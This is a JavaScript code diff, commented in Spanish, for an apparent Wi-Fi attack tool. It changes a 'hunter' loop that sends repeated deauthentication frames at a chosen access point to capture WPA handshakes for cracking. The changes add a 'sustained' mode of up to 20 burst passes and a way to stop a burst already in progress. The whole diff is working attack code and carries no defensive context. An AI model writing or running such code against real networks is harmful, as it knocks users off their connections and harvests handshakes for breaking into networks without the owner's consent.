@@ -816,6 +816,7 @@ function saveHunterTarget(bssid, ssid, channel) {
 function stopHunter(reason) {
   if (!window._hunterActive && !window._hunterRunning) return;
   window._hunterActive = false;
+  window._hunterStopRequested = true; // aborta también la ráfaga en curso
   if (window._hunterTimer) { clearTimeout(window._hunterTimer); window._hunterTimer = null; }
   hunterStatus('');
   log('[cazador] detenido' + (reason ? ' (' + reason + ')' : '') + '.', 'warn');
@@ -824,6 +825,7 @@ function startHunter(bssid, ssid, channel) {
   if (!bssid) { log('[cazador] sin objetivo: no arranca.', 'warn'); return; }
   stopHunter();
   window._hunterActive = true;
+  window._hunterStopRequested = false;
   window._hunterRunning = false;
   window._hunterCycle = 0;
   window._hunterTarget = { bssid, ssid: ssid || '', channel: parseInt(channel) || 0 };
@@ -840,7 +842,7 @@ async function hunterCycle() {
   const cy = ++window._hunterCycle;
   try {
     log('[cazador] ciclo ' + cy + ': ráfaga deauth + watcher en ' + t.bssid + (t.channel ? ' CH' + t.channel : ''), 'info');
-    const r = await window.iaDeauthBurst({ bssid: t.bssid, channel: t.channel, target_mac: null });
+    const r = await window.iaDeauthBurst({ bssid: t.bssid, channel: t.channel, target_mac: null, _hunter: true, sustained: true });
     if (r && r.success && r.hashes > 0) {
       log('[cazador] ⚡ HANDSHAKE CAPTURADO: ' + r.output_file + ' (' + r.hashes + ' hashes) · pcapng ' + r.pcapng, 'ok');
       hunterStatus('⚡ capturado');
@@ -1520,10 +1522,10 @@ window.iaDeauthBurst = async function (args) {
   // backpressure; con un init por pasada salen 2/2 con TXDONE cada vez.
   // 4 pasadas × 2 frames = 8 frames broadcast (o 5 dirigidos: 3×2).
   const framesPerPass = 2;
-  const maxPasses = da ? 3 : 4;
+  const maxPasses = args.sustained ? 20 : (da ? 3 : 4);
   let passes = 0;
   while (!window._eapolSeen && passes < maxPasses) {
-    if (window._simpleStop) break;
+    if (window._simpleStop || (args._hunter && window._hunterStopRequested)) break;
     try {
       const ini = await window.__invoke('usb_raw_init', { channel: ch });
       if (!(ini && ini.success)) log('[deauth] aviso init: ' + ((ini && ini.message) || '?'), 'warn');
